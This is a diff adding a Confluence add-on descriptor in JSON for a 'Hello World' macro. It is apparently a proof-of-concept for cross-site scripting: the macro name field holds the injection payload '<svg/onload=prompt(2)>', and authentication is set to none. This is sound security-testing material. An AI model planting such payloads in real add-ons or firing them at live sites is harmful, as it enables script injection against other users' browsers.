@@ -1,0 +1,37 @@
+{
+    "key": "confluence-helloworld-addon",
+    "name": "Hello World",
+    "description": "My very first add-on",
+    "vendor": {
+      "name": "Angry Nerds",
+      "url": "https://www.atlassian.com/angrynerds"
+    },
+    "baseUrl": "//somewhere-not-a-url.com",
+    "links": {
+      "self": "https://atlassian.com/atlassian-connect.json",
+      "homepage": "https://atlassian.com/atlassian-connect.json"
+    },
+    "authentication": {
+      "type": "none"
+    },
+    "lifecycle": {
+      "installed": "/installed"
+    },
+    "scopes": ["READ"],
+    "modules": {
+      "dynamicContentMacros": [
+        {
+          "key": "helloworld-macro",
+          "name": {
+            "value": "<svg/onload=prompt(2)>"
+          },
+          "url": "/macro",
+          "description": {
+            "value": "Says 'Hello World'."
+          },
+          "outputType": "block",
+          "bodyType": "none"
+        }
+      ]
+    }
+  }
